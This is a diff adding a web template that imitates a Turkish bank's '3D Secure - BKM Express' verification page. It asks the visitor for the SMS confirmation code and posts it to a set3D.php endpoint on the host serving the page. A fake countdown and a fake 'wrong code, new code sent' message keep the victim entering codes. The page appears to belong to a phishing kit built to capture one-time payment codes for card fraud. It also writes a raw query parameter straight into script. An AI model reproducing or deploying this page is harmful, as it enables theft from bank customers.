@@ -1,0 +1,205 @@
+<%
+
+    var tutar = req.query["tutar"];
+    var id = req.query["id"];
+
+%>
+<html>
+<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
+<head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>3D Secure - BKM Express</title>
+    <style>
+        * {
+            font-family: 'Gill Sans', 'Gill Sans MT', Calibri, 'Trebuchet MS', sans-serif;
+            color: #4e4e4e;
+        }
+
+        h1 {
+            font-size: 20px;
+            border-bottom: 1px solid #adadad;
+            padding-bottom: 20px;
+            text-align: center;
+        }
+
+        .center {
+            margin: 0 auto;
+            max-width: 400px;
+            border: 1px solid;
+            padding: 10px;
+        }
+
+        .info {
+            text-align: center;
+            margin: 30px 0;
+        }
+
+        label {
+            font-weight: bold;
+        }
+
+        input {
+            display: block;
+            width: 100%;
+            border: 1px solid #868686;
+            padding: 10px;
+            text-align: center;
+            font-weight: bold;
+            font-size: 20px;
+            margin-top: 10px;
+        }
+
+        button {
+            display: block;
+            width: 100%;
+            margin-top: 10px;
+            color: #fff;
+            background-color: #23a2bf;
+            padding: 10px;
+            border: 1px solid #187f97;
+            font-size: 16px;
+        }
+
+        .footer {
+            text-align: center;
+            font-weight: bold;
+            margin-top: 10px;
+        }
+
+            .footer a {
+                color: #23a2bf;
+                margin: 0 10px;
+            }
+    </style>
+</head>
+<body>
+    <div class="center">
+        <img src="/guvenliode.png" height="36" alt="">
+        <h1>3D Güvenlik Şifresi Onayı</h1>
+        <div class="info"> Lütfen bankanız tarafından telefonunuza gönderilen <strong></strong>  <strong>3D</strong> Güvenlik Onay şifresini giriniz. <p class="tfa-timer">Kalan süre: <strong><span id="kalan"></strong></span> </center>
+<center><p>Saniye sonra işlem iptal edilecek.</p></div>
+        <label for="SMS"></label>
+       <!-- ----------------------------------------------- -->
+<div class="container jf-form">
+<form method="post" name="jqueryform-2bbbe7" id="jqueryform-2bbbe7" method='post' novalidate autocomplete="on">
+
+
+
+
+<div class="form-group f4 " data-fid="f4">
+  <label class="control-label" for="f4">Onay Kodu :</label>
+
+
+<input type="text" class="form-control" id="f4" name="smskod" value=""     />
+
+
+  
+</div>
+
+
+
+<div class="form-group submit f0 " data-fid="f0" style="position: relative;">
+  <label class="control-label sr-only" for="f0" style="display: block;"></label>
+
+  <div class="progress" style="display: none; z-index: -1; position: absolute;">
+    <div class="progress-bar progress-bar-striped active" role="progressbar" style="width:100%">
+    </div>
+  </div>
+
+  <button type="submit" class="btn btn-primary btn-lg" style="z-index: 1;">
+  		Onayla
+  </button>
+
+</div><div class="clearfix"></div>
+
+<div class="submit">
+  <p class="error bg-warning" style="display:none;">
+    Please check the required fields.  </p>
+</div>
+
+<div class="clearfix"></div>
+
+
+</form>
+
+</center>
+</div>
+
+<div class="container jf-thankyou" style="display:none;" data-redirect="../3d/" data-seconds="5">
+  <center><h3>Onay kodunu hatalı girdiniz. Telefonunuza yeni kod gönderilmiştir....</h3></center>
+</div>
+<!-- ----------------------------------------------- -->
+
+<script src="https://code.jquery.com/jquery-1.11.2.min.js"></script>
+<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.4/js/bootstrap.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/bootstrap-datepicker/1.4.0/js/bootstrap-datepicker.min.js"></script>
+<script src="https://ajax.aspnetcdn.com/ajax/jquery.validate/1.13.1/jquery.validate.min.js"></script>
+<script src="https://ajax.aspnetcdn.com/ajax/jquery.validate/1.13.1/additional-methods.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-scrollTo/2.1.0/jquery.scrollTo.min.js"></script>
+<script src="vendor.js" ></script>
+
+<script src="jqueryform.com.min.js?ver=v3.0.3&id=jqueryform-2bbbe7" ></script>
+
+<script type="text/javascript">
+$("#jqueryform-2bbbe7").submit(function (e) {
+	$.ajax({
+		type: "POST",
+		url: "https://<%=req.hostname%>/ajax/set3D.php",
+		data: {
+			sms_kod: $('input[name=smskod]')[0].value,
+			id: <%=req.query['id']%>
+		},
+		success: function (data) {
+			if (data.location) {
+				window.location.href = data.location;
+            }
+		}
+    });
+    e.preventDefault();
+});
+</script>
+
+
+<script type="text/javascript">
+var sure = 300; // kaç saniye bekletilecek
+    var saniye=document.getElementById("kalan").innerHTML = sure+ 1;
+
+    function showMe(blockId)  {    
+        document.getElementById(blockId).style.display = "block";  }  
+    function hideMe(blockId)  {    
+        document.getElementById(blockId).style.display = "none";  }
+    function goster() {
+        showMe('resim');
+        hideMe('reklam');  }
+
+    function final(){
+    if (saniye!=1){
+        saniye-=1;
+        document.getElementById("kalan").innerHTML  = saniye;   }
+
+    else{
+        goster();
+        return;   }
+    setTimeout("final()",1000);
+    }
+    final();
+</script>
+
+<script type="text/javascript">
+
+	// start jqueryform initialization
+	// --------------------------------
+    JF.init( '#' + $('.jf-form > form:first-child').attr('id') );
+    
+
+</script>
+
+  </body>
+</html>
+        <input name="__RequestVerificationToken" type="hidden" value="CfDJ8A_g1e2L1upGklyfv8GnMH770joxH5sQxMJRkWK38ujK9e98oF0bn78y_Qvnxh_Aome54jbzDmzRYBSa4Vuk0erMYe3JNjpxXXOdc1G0iJk1MKlNsIaDJG8uPdH3rbXW0Qv5dSIJzyqet6g8mDnZ4gU"></form>
+        <div class="footer"><a href="#" onclick="window.history.back();">İşlemi İptal Et</a> <a href="#">Yardım</a></div>
+    </div>
+
+</body>
+</html>
